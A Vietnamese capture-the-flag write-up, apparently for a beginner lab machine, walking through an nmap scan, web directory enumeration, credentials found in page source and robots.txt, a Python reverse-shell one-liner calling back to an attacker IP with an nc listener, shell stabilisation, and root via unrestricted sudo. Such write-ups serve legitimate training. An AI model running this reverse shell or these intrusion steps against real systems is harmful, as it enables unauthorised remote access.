
![[Pasted image 20260927205431.png]]


# 1. Nmap


![[Pasted image 20260927205248.png]]


- Nhận xét về host:
	- Cổng 80 HTTP server apache: chắc đây là thứ ta phải quan tâm
	- Cổng 22 SSH: chúng ta chưa có thông tin để khai thác 


# 2. Web Enumeration

trang web
![[Pasted image 20260927210050.png]]



Ctrl+U -> chúng ta có username 
![[Pasted image 20260927210414.png]]

- không có domain => không enumerate subdomains
- directory enumeration


```bash
feroxbuster --url url --wordlist /path/to/líst -x php,html,css,js,png,jpeg,jpg,phtml,txt
```



![[Pasted image 20260927210213.png]]

- có 2 thứ đáng ngờ ở đây:

	- robots.txt chứa thứ kỳ lạ? tôi đoán là password?
	- login.php: Trang đăng nhập

robots.txt
![[Pasted image 20260927210501.png]]

=> credentials là: R1ckRul3s:Wubbalubbadubdub

login.php
![[Pasted image 20260927210644.png]]


![[Pasted image 20260927210809.png]]

hờ vào được rồi nè


 
 Khi tôi đánh "which python3" thì nó ra
 ![[Pasted image 20260927211511.png]]

Thôi thì reverse shell thôi =))

# 3. foothold as www-data

```bash
Attacker:
nc -lvnp 4444

Victim: 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.129.202",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![[Pasted image 20260927211830.png]]



### Thủ thuật stable shell
```bash

python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl + Z 
stty raw -echo && fg

Enter 2 lần

export TERM=xterm

```


![[Pasted image 20260927212029.png]]



# 3. leo lên root


sudo -l

![[Pasted image 20260927212153.png]]

- Vậy là dễ thật đấy nó cho mình dùng gì cũng được =)) 
- thôi thì "sudo bash" => lên root thôi

![[Pasted image 20260927212256.png]]


### rồi giờ tìm gì thì tìm =))


# kỹ thuật sử dụng:

- Nmap scan
- Web Enumeration
- System Enumeration (ở đây là tìm câu lệnh được dùng)
- Reverse shell
- Local Privilege Escalation

